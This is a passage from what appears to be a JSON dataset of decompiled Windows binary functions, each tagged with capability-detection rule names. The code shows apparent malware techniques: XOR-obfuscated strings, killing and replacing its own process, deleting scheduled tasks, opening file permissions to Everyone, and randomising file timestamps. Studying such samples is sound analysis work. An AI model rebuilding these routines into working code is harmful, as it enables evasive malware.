   var_abh = 0x75;\n    var_aah = 0x1c;\n    var_a9h = 0x55;\n    var_a8h = 0x19;\n    var_a7h = 0x6f;\n    var_a6h = 0x29;\n    var_a5h = 0x68;\n    var_a4h = 0x19;\n    var_a3h = 0x78;\n    var_a2h = 0;\n    var_a1h = 0x75;\n    var_a0h = 0xb;\n    var_9fh = 0x55;\n    var_9eh = 0x19;\n    var_9dh = 0x6f;\n    var_9ch = 0x19;\n    var_9bh = 0x68;\n    var_9ah = 9;\n    var_99h = 0x78;\n    var_98h = 0x3b;\n    var_97h = 0x75;\n    var_96h = 0xd;\n    var_95h = 0x55;\n    var_94h = 0x15;\n    var_93h = 0x6f;\n    var_92h = 5;\n    var_91h = 0x68;\n    var_90h = 0x55;\n    var_8fh = 0x78;\n    var_2ch._0_1_ = 0x68;\n    var_2ch._1_1_ = 0x55;\n    var_2ch._2_1_ = 0x78;\n    var_2ch._3_1_ = 0x6f;\n    var_28h = 0x75;\n    fcn.004012a0(0x4c);\n    for (var_ch = 0; var_ch < 0x26; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, var_b4h[var_ch] ^ *(&var_2ch + var_ch % 5));\n    }\n    var_100h = fcn.00401270();\n    var_fch = fcn.00401270();\n    iVar2 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    if (iVar2 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, 0x425580, lpProfileDir);\n        hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        while (hFindFile != -1) {\n            iVar2 = fcn.004150b0(&var_324h);\n            if (iVar2 == 0) {\n                for (var_20h = 0; var_20h < 2; var_20h = var_20h + 1) {\n                    var_4ch._0_1_ = 0x68;\n                    var_4ch._1_1_ = 0x52;\n                    var_4ch._2_1_ = 100;\n                    var_4ch._3_1_ = 0x6b;\n                    var_48h = 0x34;\n                    var_47h = 0x7a;\n                    var_54h._0_1_ = 0x34;\n                    var_54h._1_1_ = 0x52;\n                    var_54h._2_1_ = 0x4e;\n                    var_54h._3_1_ = 0x6b;\n                    var_50h = 0x34;\n                    var_4fh = 0x7a;\n                    fcn.004012a0(0xc);\n                    for (var_10h = 0; var_10h < 6; var_10h = var_10h + 1) {\n                        fcn.00401280(var_10h, *(&var_4ch + var_10h) ^ *(&var_54h + var_10h % 6));\n                    }\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, lpProfileDir);\n                    uVar1 = fcn.00401270();\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(lpFileName, uVar1);\n                    var_68h[0] = 0x75;\n                    var_68h[1] = 0x72;\n                    var_68h[2] = 0x1c;\n                    var_68h[3] = 0x69;\n                    var_64h = 0xc;\n                    var_63h = 0x50;\n                    var_62h = 0x57;\n                    var_61h = 0x6f;\n                    var_60h = 0x1a;\n                    var_5fh = 0x50;\n                    var_5eh = 0xc;\n                    var_5dh = 0x72;\n                    var_5ch = 0x4a;\n                    var_5bh = 0x69;\n                    var_5ah = 0x23;\n                    var_59h = 0x50;\n                    var_58h = 0x72;\n                    var_57h = 0x6f;\n                    var_34h._0_1_ = 0x50;\n                    var_34h._1_1_ = 0x72;\n                    var_34h._2_1_ = 0x6f;\n                    var_34h._3_1_ = 0x69;\n                    var_30h = 0x50;\n                    fcn.004012a0(0x24);\n                    for (var_14h = 0; var_14h < 0x12; var_14h = var_14h + 1) {\n                        fcn.00401280(var_14h, var_68h[var_14h] ^ *(&var_34h + var_14h % 5));\n                    }\n                    uVar1 = fcn.00401270(lpProfileDir, &var_324h, (&var_100h)[var_20h]);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, uVar1);\n                    fcn.004169a0(ARG_0, 1, 1);\n                    fcn.004012d0();\n                    fcn.004012d0();\n                }\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n            if (iVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                hFindFile = -1;\n            }\n        }\n    }\n    var_8ch[0] = 0x13;\n    var_8ch[1] = 0x68;\n    var_8ch[2] = 3;\n    var_8ch[3] = 0x54;\n    var_88h = 0x11;\n    var_87h = 0x36;\n    var_86h = 0x1b;\n    var_85h = 0x50;\n    var_84h = 0x20;\n    var_83h = 0x68;\n    var_82h = 0x53;\n    var_81h = 0x68;\n    var_80h = 0x3d;\n    var_7fh = 0x54;\n    var_7eh = 0x3a;\n    var_7dh = 0x36;\n    var_7ch = 7;\n    var_7bh = 0x50;\n    var_7ah = 0x3b;\n    var_79h = 0x68;\n    var_78h = 0x42;\n    var_77h = 0x68;\n    var_76h = 0x75;\n    var_75h = 0x54;\n    var_74h = 0x34;\n    var_73h = 0x36;\n    var_72h = 0x3c;\n    var_71h = 0x50;\n    var_70h = 0x31;\n    var_6fh = 0x68;\n    var_6eh = 0x5b;\n    var_6dh = 0x68;\n    var_6ch = 0x20;\n    var_6bh = 0x54;\n    var_6ah = 0x68;\n    var_69h = 0x36;\n    var_3ch[0] = 0x36;\n    var_3ch[1] = 0x68;\n    var_3ch[2] = 0x50;\n    var_3ch[3] = 0x54;\n    var_38h = 0x68;\n    fcn.004012a0(0x48);\n    for (var_18h = 0; var_18h < 0x24; var_18h = var_18h + 1) {\n        fcn.00401280(var_18h, var_8ch[var_18h] ^ var_3ch[var_18h % 5]);\n    }\n    uVar1 = fcn.00401270(lpProfileDir, 0x104);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(uVar1);\n    fcn.004169a0(lpProfileDir, 1, 1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, ARG_0);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpProfileDir);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    return;\n}\n",
        "token_count": 4264
    },
    "00415960": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00415960(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_724h;\n    uint var_51ch;\n    uint var_314h;\n    uint var_310h;\n    int32_t var_30ch;\n    uint var_2fch;\n    uint var_2f0h;\n    uint var_e8h;\n    uint var_68h;\n    uint var_24h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    var_314h = 0;\n    sub.ntdll.dll_memset(&var_310h, 0, 0x228);\n    var_10h = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    var_e8h._0_2_ = 0;\n    sub.ntdll.dll_memset(&var_e8h + 2, 0, 0x7e);\n    var_ch = 0;\n    var_314h = 0x22c;\n    var_68h = 0x44;\n    puVar3 = &var_24h;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_68h;\n    for (iVar2 = 0x44; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if (var_4h == -1) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar1 = 0xffffffff;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(var_4h, &var_314h);\n        if (iVar2 != 0) {\ncode_r0x00415a19:\n            if (var_10h != var_30ch) goto code_r0x00415a89;\n            puVar3 = &var_51ch;\n            for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            fcn.00405630(var_2fch, &var_51ch);\n            uVar1 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(&var_51ch);\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(&var_e8h, uVar1);\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(&var_724h, &var_51ch);\n            (*_sym.imp.SHLWAPI.dll_StrCatW)(&var_724h, 0x42565c);\ncode_r0x00415aa2:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(var_4h);\n        }\n        do {\n            var_4h = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n            var_ch = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(var_4h, &var_314h);\n            while (iVar2 != 0) {\n                if ((var_10h != var_30ch) &&\n                   (iVar2 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_e8h, &var_2f0h),  iVar2 == 0)) {\n                    var_14h = 0;\n                    var_8h = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x401, 0, var_30ch);\n                    if (var_8h != 0) {\n                        iVar2 = (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(var_8h, &var_14h);\n                        if ((iVar2 != 0) && (var_14h == 0x103)) {\n                            var_ch = 1;\n                            (*_sym.imp.KERNEL32.dll_TerminateProcess)(var_8h, 0);\n                        }\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n                    }\n                }\n                iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(var_4h, &var_314h);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(var_4h);\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n        } while (var_ch != 0);\n        while (iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(&var_51ch),  iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar2 = (*_sym.imp.KERNEL32.dll_MoveFileExW)(&var_51ch, &var_724h, 1);\n            if (iVar2 != 0) break;\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            (*_sym.imp.KERNEL32.dll_Sleep)(500);\n        }\n        while (iVar2 = (*_sym.imp.KERNEL32.dll_CopyFileW)(*0x436b44, &var_51ch, 0),  iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            (*_sym.imp.KERNEL32.dll_Sleep)(100);\n        }\n        while (iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                                 (0, &var_51ch, 0, 0, 0, 0x9000008, 0, 0, &var_68h, &var_24h),  iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        }\n        fcn.00423a50(0);\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        uVar1 = 0;\n    }\n    return uVar1;\ncode_r0x00415a89:\n    iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(var_4h, &var_314h);\n    if (iVar2 == 0) goto code_r0x00415aa2;\n    goto code_r0x00415a19;\n}\n",
        "token_count": 1491
    },
    "00415dc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00415dc0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint pszDst;\n    int32_t var_50h;\n    int16_t *var_4ch;\n    int32_t var_48h;\n    uint pv;\n    int16_t var_3eh;\n    uint var_3ch;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uint8_t var_30h [4];\n    uchar var_2ch;\n    uchar var_2bh;\n    int32_t pszFirst;\n    uint var_24h;\n    int16_t *var_20h;\n    int32_t *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int16_t *pszSrc;\n    int32_t var_4h;\n    \n    var_1ch = NULL;\n    var_ch = NULL;\n    var_10h = NULL;\n    var_48h = 0;\n    var_18h = 0;\n    var_3ch._0_1_ = 0x32;\n    var_3ch._1_1_ = 0x39;\n    var_3ch._2_1_ = 0x16;\n    var_3ch._3_1_ = 0x75;\n    var_38h = 0x58;\n    var_37h = 0x42;\n    var_36h = 0x74;\n    var_35h = 0x39;\n    var_34h = 0x56;\n    var_33h = 0x75;\n    var_32h = 0x34;\n    var_31h = 0x42;\n    var_30h[0] = 0x56;\n    var_30h[1] = 0x39;\n    var_30h[2] = 0x7a;\n    var_30h[3] = 0x75;\n    var_2ch = 0x34;\n    var_2bh = 0x42;\n    fcn.004012a0(0x18);\n    for (var_14h = 0; var_14h < 0xc; var_14h = var_14h + 1) {\n        fcn.00401280(var_14h, *(&var_3ch + var_14h) ^ var_30h[var_14h % 6]);\n    }\n    var_4h = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < var_4h) {\n        var_4h = (*_sym.imp.ole32.dll_CoCreateInstance)(0x4253a0, 0, 1, 0x4253b0, &var_ch);\n        if ((-1 < var_4h) && (var_ch != NULL)) {\n            var_4h = (**(*var_ch + 0x14))(var_ch, &var_1ch);\n            if ((-1 < var_4h) && (var_1ch != NULL)) {\n                while( true ) {\n                    iVar2 = (**(*var_1ch + 0xc))(var_1ch, 0xf, &var_48h, &var_18h);\n                    if ((iVar2 < 0) || (var_18h == 0)) break;\n                    while (var_18h != 0) {\n                        var_18h = var_18h + -1;\n                        pv = *(var_48h + var_18h * 4);\n                        var_4h = (**(*var_ch + 0x18))(var_ch, pv, 0x4253c0, &var_10h);\n                        if ((-1 < var_4h) && (var_10h != NULL)) {\n                            pszFirst = 0;\n                            pszSrc = NULL;\n                            var_4h = (**(*var_10h + 0x84))(var_10h, &pszFirst);\n                            if ((-1 < var_4h) && (pszFirst != 0)) {\n                                iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x436b44);\n                                if (iVar2 != 0) {\n                                    var_4h = (**(*var_10h + 0x8c))(var_10h, &pszSrc);\n                                    if ((-1 < var_4h) && (pszSrc != NULL)) {\n                                        uVar3 = fcn.00401270();\n                                        iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszSrc, uVar3);\n                                        if ((iVar2 != 0) &&\n                                           (((*pszSrc == 0x22 && (pszSrc[2] == 0x3a)) && (pszSrc[3] == 0x5c)))) {\n                                            puVar4 = &pszDst;\n                                            for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                                *puVar4 = 0;\n                                                puVar4 = puVar4 + 1;\n                                            }\n                                            var_20h = fcn.00401270();\n                                            var_4ch = var_20h + 1;\n                                            do {\n                                                var_3eh = *var_20h;\n                                                var_20h = var_20h + 1;\n                                            } while (var_3eh != 0);\n                                            var_50h = var_20h - var_4ch >> 1;\n                                            uVar3 = fcn.00401270();\n                                            iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszSrc, uVar3);\n                                            (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                      (&pszDst, pszSrc + 1, ((iVar2 - pszSrc >> 1) - 2) + var_50h);\n                                            cVar1 = fcn.00415900(&pszDst);\n                                            if (cVar1 == '\\0') {\n                                                (**(*var_ch + 0x1c))(var_ch, pv);\n                                            }\n                                        }\n                                        (*_sym.imp.ole32.dll_CoTaskMemFree)(pszSrc);\n                                    }\n                                }\n                                (*_sym.imp.ole32.dll_CoTaskMemFree)(pszFirst);\n                            }\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        (*_sym.imp.ole32.dll_CoTaskMemFree)(pv);\n                    }\n                    (*_sym.imp.ole32.dll_CoTaskMemFree)(var_48h);\n                }\n                (**(*var_1ch + 8))(var_1ch);\n            }\n            (**(*var_ch + 8))(var_ch);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    fcn.004012d0();\n    return;\n}\n",
        "token_count": 1595
    },
    "00416170": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00416170(uint lpFileName)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uint pIdentifierAuthority;\n    uchar var_10h;\n    uchar var_fh;\n    int32_t pDacl;\n    int32_t pSid;\n    int32_t pSecurityDescriptor;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority._0_1_ = 0;\n    pIdentifierAuthority._1_1_ = 0;\n    pIdentifierAuthority._2_1_ = 0;\n    pIdentifierAuthority._3_1_ = 0;\n    var_10h = 0;\n    var_fh = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar2 = &var_34h;\n    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_34h = 0xffffffff;\n    uStack52 = 1;\n    uStack48 = 0;\n    uStack36 = 0;\n    uStack32 = 5;\n    iStack28 = pSid;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_34h, 0, &pDacl);\n    pSecurityDescriptor = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(pSecurityDescriptor, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(pSecurityDescriptor, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(lpFileName, 4, pSecurityDescriptor);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (pSecurityDescriptor != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pSecurityDescriptor);\n    }\n    return;\n}\n",
        "token_count": 591
    },
    "004162b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004162b0(int32_t lpFileName, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t lpNumberOfBytesRead;\n    int32_t var_14h;\n    int32_t hObject;\n    int32_t nNumberOfBytesToRead;\n    int32_t var_8h;\n    int32_t lpBuffer;\n    \n    var_8h = -1;\n    lpBuffer = 0;\n    var_14h = fcn.00416900(lpFileName);\n    if (var_14h != 0) {\n        lpFileName = var_14h;\n    }\n    hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (hObject != -1) {\n        nNumberOfBytesToRead = (*_sym.imp.KERNEL32.dll_GetFileSize)(hObject, 0);\n        if (nNumberOfBytesToRead == 0) {\n            var_8h = 0xe8;\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, nNumberOfBytesToRead + 2);\n            lpBuffer = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if ((lpBuffer != 0) &&\n               (iVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                  (hObject, lpBuffer, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0),  iVar1 != 0)) {\n                if (nNumberOfBytesToRead == lpNumberOfBytesRead) {\n                    *(lpBuffer + nNumberOfBytesToRead) = 0;\n                    *arg_ch = lpBuffer;\n                    *arg_10h = nNumberOfBytesToRead;\n                    var_8h = 0;\n                }\n                else {\n                    var_8h = 0x1e;\n                }\n            }\n        }\n    }\n    if (var_8h == -1) {\n        var_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    if (hObject != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    if ((lpBuffer != 0) && (var_8h != 0)) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpBuffer);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    if (var_14h != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return var_8h;\n}\n",
        "token_count": 631
    },
    "00416400": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00416400(uint lpCreationTime, uint lpLastAccessTime, uint lpLastWriteTime)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_64h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uint lpSystemTime;\n    uint var_2ah;\n    int16_t var_26h;\n    int16_t var_24h;\n    int16_t var_22h;\n    uint8_t var_20h [4];\n    uchar var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t hObject;\n    int32_t lpFileName;\n    int32_t var_8h;\n    uint var_4h;\n    \n    lpFileName = 0;\n    var_4h = *0x436b98;\n    hObject = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    uVar1 = fcn.00401850(&var_4h);\n    lpSystemTime._2_2_ = uVar1 % 0xb + 1;\n    uVar1 = fcn.00401850(&var_4h);\n    var_2ah._0_2_ = uVar1 % 0x1b + 1;\n    uVar1 = fcn.00401850(&var_4h);\n    var_2ah._2_2_ = uVar1 % 0x16 + 1;\n    uVar1 = fcn.00401850(&var_4h);\n    var_26h = uVar1 % 0x3b + 1;\n    uVar1 = fcn.00401850(&var_4h);\n    var_24h = uVar1 % 0x3b + 1;\n    uVar1 = fcn.00401850(&var_4h);\n    var_22h = uVar1 % 0x3e6 + 1;\n    uVar1 = fcn.00401850(&var_4h);\n    var_22h = uVar1 % 0x3e6 + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n    var_64h._0_1_ = 0x56;\n    var_64h._1_1_ = 0x51;\n    var_64h._2_1_ = 0x43;\n    var_64h._3_1_ = 0x53;\n    var_60h = 0x18;\n    var_5fh = 0x73;\n    var_5eh = 0x3f;\n    var_5dh = 0x34;\n    var_5ch = 0x37;\n    var_5bh = 0x71;\n    var_5ah = 0x1a;\n    var_59h = 0x51;\n    var_58h = 0x46;\n    var_57h = 0x53;\n    var_56h = 0x54;\n    var_55h = 0x73;\n    var_54h = 0xd;\n    var_53h = 0x34;\n    var_52h = 0x20;\n    var_51h = 0x71;\n    var_50h = 10;\n    var_4fh = 0x51;\n    var_4eh = 0x47;\n    var_4dh = 0x53;\n    var_4ch = 5;\n    var_4bh = 0x73;\n    var_4ah = 0x34;\n    var_49h = 0x34;\n    var_48h = 0x3e;\n    var_47h = 0x71;\n    var_46h = 0x40;\n    var_45h = 0x51;\n    var_44h = 6;\n    var_43h = 0x53;\n    var_42h = 0x2d;\n    var_41h = 0x73;\n    var_40h = 0x32;\n    var_3fh = 0x34;\n    var_3eh = 0x3e;\n    var_3dh = 0x71;\n    var_3ch = 0x17;\n    var_3bh = 0x51;\n    var_3ah = 0x1a;\n    var_39h = 0x53;\n    var_38h = 0x14;\n    var_37h = 0x73;\n    var_36h = 0x29;\n    var_35h = 0x34;\n    var_34h = 0x36;\n    var_33h = 0x71;\n    var_32h = 0x73;\n    var_31h = 0x51;\n    var_20h[0] = 0x73;\n    var_20h[1] = 0x51;\n    var_20h[2] = 0x34;\n    var_20h[3] = 0x53;\n    var_1ch = 0x71;\n    fcn.004012a0(0x68);\n    for (var_8h = 0; var_8h < 0x34; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_64h + var_8h) ^ var_20h[var_8h % 5]);\n    }\n    uVar2 = fcn.00401270();\n    lpFileName = fcn.00416900(uVar2);\n    if (lpFileName != 0) {\n        hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0, 0);\n        if ((hObject != 0) && (hObject != -1)) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetFileTime)(lpFileName, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar3 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    var_18h = 0;\n    fcn.004012d0();\n    return var_18h;\n}\n",
        "token_count": 1940
    },
    "00416720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00416720(int32_t lpFileName)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    iVar1 = fcn.00416900(lpFileName);\n    if (iVar1 != 0) {\n        lpFileName = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n    if (iVar2 == 0) {\n        var_8h = fcn.0041bb20(lpFileName);\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return var_8h;\n}\n",
        "token_count": 199
    },
    "00416790": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
